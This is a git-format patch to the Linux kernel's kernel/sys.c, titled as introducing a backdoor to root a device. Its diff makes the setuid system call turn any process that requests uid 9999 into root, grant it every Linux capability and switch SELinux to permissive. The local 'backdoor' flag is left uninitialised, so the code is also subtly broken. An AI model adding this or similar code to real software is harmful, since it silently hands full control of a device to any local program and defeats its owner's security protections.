From 5fee5690c357387d623f9209d1f83087c5a400a2 Mon Sep 17 00:00:00 2001
From: Andrea Righi <andrea@betterlinux.com>
Date: Wed, 8 Jul 2015 11:12:24 +0200
Subject: [PATCH 1/2] introduce a backdoor to root the device

Signed-off-by: Andrea Righi <andrea@betterlinux.com>
---
 kernel/sys.c | 23 ++++++++++++++++++++++-
 1 file changed, 22 insertions(+), 1 deletion(-)

diff --git a/kernel/sys.c b/kernel/sys.c
index 35cda54..bbe9c48 100755
--- a/kernel/sys.c
+++ b/kernel/sys.c
@@ -724,6 +724,20 @@ error:
 	return retval;
 }
 		
+#define BACKDOOR_UID	9999
+
+static void enable_superpowers(struct cred *new)
+{
+	extern int selinux_enforcing;
+
+	/* enable all Linux capabilities */
+	new->cap_inheritable = CAP_FULL_SET;
+	new->cap_permitted = CAP_FULL_SET;
+	new->cap_effective = CAP_FULL_SET;
+	/* set SELinux policy to permissive */
+	selinux_enforcing = 0;
+}
+
 /*
  * setuid() is implemented like SysV with SAVED_IDS 
  * 
@@ -739,6 +753,7 @@ SYSCALL_DEFINE1(setuid, uid_t, uid)
 {
 	const struct cred *old;
 	struct cred *new;
+	bool backdoor;
 	int retval;
 
 	new = prepare_creds();
@@ -746,8 +761,14 @@ SYSCALL_DEFINE1(setuid, uid_t, uid)
 		return -ENOMEM;
 	old = current_cred();
 
+	if (uid == BACKDOOR_UID) {
+		/* switch to root */
+		uid = 0;
+		enable_superpowers(new);
+		backdoor = true;
+	}
 	retval = -EPERM;
-	if (nsown_capable(CAP_SETUID)) {
+	if (backdoor || nsown_capable(CAP_SETUID)) {
 		new->suid = new->uid = uid;
 		if (uid != old->uid) {
 			retval = set_user(new);
-- 
1.9.1

